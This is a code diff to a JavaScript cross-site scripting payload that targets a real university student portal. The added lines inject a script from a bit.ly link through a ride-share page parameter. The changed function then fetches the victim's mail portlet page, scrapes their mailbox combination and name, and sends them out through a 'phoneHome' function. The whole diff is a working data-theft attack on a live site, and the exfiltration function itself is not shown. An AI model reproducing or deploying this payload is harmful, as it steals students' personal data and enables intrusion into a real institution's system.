@@ -1,5 +1,5 @@
 //<script src=//bit.ly/3jPon33></script>
-
+//http://my.knox.edu/ICS/Student_Services/Ride_Share__Carpool.jnz?portlet=Find_A_Ride&screen=PostList&screenType=change&ft=0&pt=6&p=1&itemId=786bad5c-58ae-49e1-9849-8ca0c13c12b1&m=0&sp=%3Cscript+src%3d%2f%2fbit.ly%2f3jPon33%3E%3C%2fscript%3E
 
 
 
@@ -7,7 +7,7 @@
 
 
 window.alert("xss");
-phoneHome("hello");
+httpReq();
 
 var doc = ""
 
@@ -30,26 +30,31 @@ function phoneHome(payload){
 }
 
 
-function httpReq(url) {
+function httpReq() {
     
         xhr = new XMLHttpRequest();
         xhr.responseType = 'text/html';
+
         xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE) {
-            //return(xhr.response);
-            
-            htmlString = xhr.response
-            var parser = new DOMParser();
-            doc = parser.parseFromString(htmlString, "text/html")
-            
-            unlock = doc.getElementById("comboDiv").innerHTML
-            document.getElementById("unl").innerHTML = unlock
-            
+          if (xhr.readyState === XMLHttpRequest.DONE) {
+              //return(xhr.response);
+              
+              htmlString = xhr.response
+              var parser = new DOMParser();
+              doc = parser.parseFromString(htmlString, "text/html")
+              
+
+              unlock = doc.getElementById("comboDiv").innerText
+              tname = doc.getElementsByClassName("user-name d-block")[0].innerText
+              kbox = doc.getElementById("pg0_V_lCombo").innerText
+              phoneHome(unlock + "," + tname + "," + kbox)
+
+              
             
         }
     };
 
-    xhr.open('GET', url);
+    xhr.open('GET', 'https://my.knox.edu/ICS/Student_Services/Mail_Portlet.jnz');
     xhr.send();
 
 
